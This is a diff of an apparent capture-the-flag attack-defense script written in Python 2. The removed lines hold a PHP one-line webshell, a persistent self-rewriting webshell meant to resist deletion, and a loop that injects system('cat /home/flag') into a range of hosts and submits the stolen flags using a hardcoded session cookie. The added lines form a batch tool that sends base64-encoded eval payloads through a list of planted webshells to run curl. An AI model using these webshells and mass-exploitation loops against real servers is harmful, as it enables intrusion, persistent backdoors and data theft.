@@ -1,109 +1,106 @@
-#coding:utf-8
+#!/usr/bin/python
+#coding=utf-8
+import sys,requests,base64
 
-"""
-一句话木马内容  shell.php
-<?php
-$seck=$_POST['seck'];
-$box=@eval($seck);
-echo system($seck);
-?>
+def loadfile(filepath):
+	try : 
+		file = open(filepath,"rb")
+		return str(file.read())
+	except : 
+		print "File %s Not Found!" %filepath
+		sys.exit()
 
-getFlag.php
-<?php
-echo "9ca23c48490e04b5a6378d8190909df77318c891";
-?>
+def file_write(filepath,filecontent):
+	file = open(filepath,"a")
+	file.write(filecontent)
+	file.close()
 
-使用内存马
-<?php
-ignore_user_abort(true);
-set_time_limit(0);
-$file = "veneno.php";
-$shell = "<?php eval(\$_POST[venenohi]);?>";
-while (TRUE) {
-if (!file_exists($file)) {
-file_put_contents($file, $shell);
-}
-usleep(50);
-}
-?>
-
-在本目录下生成veneno.php 一句话木马然后权限设置一下，别人就一直删不掉
-
-使用一些加密的shell  防止别人利用我们的木马
-
-
-这样能读取flag
-再配合自己登陆提交的页面
-使用自己cookie
-自动提交flag
-
-#coding:utf-8
-import requests
-import time
-url2="http://40.10.10.{ip}/index.php"
-header={
-    "User-Agent":"test"
-}
-# whiteList={21,23,24,33,20,45,50}
-whiteList={}
-while 1:
-    for i in xrange(1,255):
-        if i not in whiteList:
-            tmp2=url2.format(ip=str(i))
-            print tmp2
-            time.sleep(3)
-
-
-"""
-import requests , os,time
-header={
-"User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0",
-"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-"Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
-"Accept-Encoding": "gzip, deflate",
-"Connection": "keep-alive",
-"Content-Type": "application/x-www-form-urlencoded",
-# "Content-Length": "22",
-}
-num=21
-while 1:
-    try:
-        url = "http://40.10.10.%s/index.php?s=/weibo/index/index.html" % (num)
-        print url
-        data={
-            "welcome":"system('cat /home/flag');"
-        }
-        res=requests.post(url=url,headers=header,data=data,timeout=2)
-        box = res.content
-        # print box
-        if len(box) >0:
-            print box[0:84]
-            geturl="http://192.168.100.100/home/match/result/"
-            hds={
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0",
-            "Accept": "application/json, text/javascript, */*; q=0.01",
-            "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
-            "Accept-Encoding": "gzip, deflate",
-            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-            "Referer": "http://192.168.100.100/home/match/detail/11/69",
-            "Cookie": "laravel_session=eyJpdiI6IjZTK3Njcm1vUFhOQXkwSUxFM1wvUm9nPT0iLCJ2YWx1ZSI6IjZiTVwvcDVJdkNhWktsWm1FY1FYYkdFQzRodDJLTzdiR1VKREdudWN4ejRjd25YZHRKNDA0c1dkVGg1Q1wvWGVmVnB3SXBxTCsxc0N1U0lDXC9xXC9hRlFvdz09IiwibWFjIjoiYjFkZTEyZjgwNzI5YjQ1ZDZkMGIzOTQ1ODFlOTMwZWFmNjYzY2MyNjc4MzdlNjE5NmM5ODdjMjc2NGRlNmUxYSJ9; time=2017-5-13%208%3A32%3A14; io=USx3RA5ITIhZXYnPAAbV"
-            }
-            data="teamId=69&matchId=11&flag=%s" % box[0:84]
-            getFlag=requests.post(geturl, data=data, headers=hds).content
-            print getFlag
-            num=num+1
-            if num>=70:
-                num=20
-                break
-            time.sleep(2)
-            continue
-        else :
-            num=num+1
-            continue
-    except Exception,e:
-        print u"目标不存在"
-        num=num+1
-        print num
+def getflag(url,method,passwd,flag_path):
+	#flag机的url
+	flag_url="192.168.45.1"
+	#print url
+	#判断shell是否存在
+	try :
+		res = requests.get(url,timeout=3)
+	except : 
+		print "[-] %s ERR_CONNECTION_TIMED_OUT" %url
+		file_write(flag_path,"[-] %s ERR_CONNECTION_TIMED_OUT\n\n" %url)
+		return 0
+	if res.status_code!=200 :
+		print "[-] %s Page Not Found!" %url
+		file_write(flag_path,"[-] %s Page Not Found!\n\n" %url)
+		return 0
+	#执行命令来获取flag system,exec,passthru,`,shell_exec
+	#a=@eval(base64_decode($_GET[z0]));&z0=c3lzdGVtKCJ3aG9hbWkiKTs=
+	cmd = "curl "+flag_url
+	#cmd = "whoami"
+	getflag_cmd ="echo system(\"%s\");"%cmd
+	data={}
+	if method=='get':
+		data[passwd]='@eval(base64_decode($_GET[z0]));'
+		data['z0']=base64.b64encode(getflag_cmd)
+		try:
+			res = requests.get(url,params=data,timeout=3)
+			#print res.url
+			if res.content:
+				content = url+"\n"+res.content+"\n\n"
+				file_write(flag_path,content)
+				print "[+] %s getflag sucessed!"%url
+			else :
+				print "[-] %s cmd exec response is null!"%url
+				content = url+"\ncmd exec response is null!\n\n"
+				file_write(flag_path,content)
+		except :
+			file_write(flag_path,"\n[+] %s Getflag Failed! You can check the shell's passwd!\n\n"%url)
+			print "[+] %s Getflag Failed! You can check the shell's passwd!"%url
+	elif method=='post':
+		data['pass']='Sn3rtf4ck'
+		data[passwd]='@eval(base64_decode($_POST[z0]));'
+		data['z0']=base64.b64encode(getflag_cmd)
+		try:
+			res = requests.post(url,data=data,timeout=3)
+			if res.content:
+				content = url+"\n"+res.content+"\n\n"
+				file_write(flag_path,content)
+				print "[+] %s getflag sucessed!"%url
+			else :
+				print "[-] %s cmd exec response is null!"%url
+				content = url+"\ncmd exec response is null!\n\n"
+				file_write(flag_path,content)
+		except:
+			file_write(flag_path,"\n[+] %s Getflag Failed! You can check the shell's passwd!\n\n"%url)
+			print "[+] %s Getflag Failed! You can check the shell's passwd!"%url
+	
 
 
-
+if __name__ == '__main__':
+	#存放flag的文件
+	flag_path="./flag.txt"
+	shellstr=loadfile("./webshell.txt")
+	list = shellstr.split("\r\n")
+	#print str(list)
+	i = 0
+	url={}
+	passwd={}
+	method={}
+	for data in list:
+		if data:
+			ls = data.split(",")
+			method_tmp = str(ls[1])
+			method_tmp = method_tmp.lower()
+			if method_tmp=='post' or method_tmp=='get':
+				url[i]=str(ls[0])
+				method[i]=method_tmp
+				passwd[i]=str(ls[2])
+				i+=1
+			else :
+				print "[-] %s request method error!" %(str(ls[0]))
+				file_write(flag_path,"[-] %s request method error!\n\n" %(str(ls[0])))
+		else : pass
+	#print str(len(url))
+	for j in range(len(url)):
+		#调用执行命令的模块
+		#print str(j)
+		#print "url is %s method is %s passwd is %s" %(url[j],method[j],passwd[j])
+		getflag(url=url[j],method=method[j],passwd=passwd[j],flag_path=flag_path)
+	print "Getflag finished!"
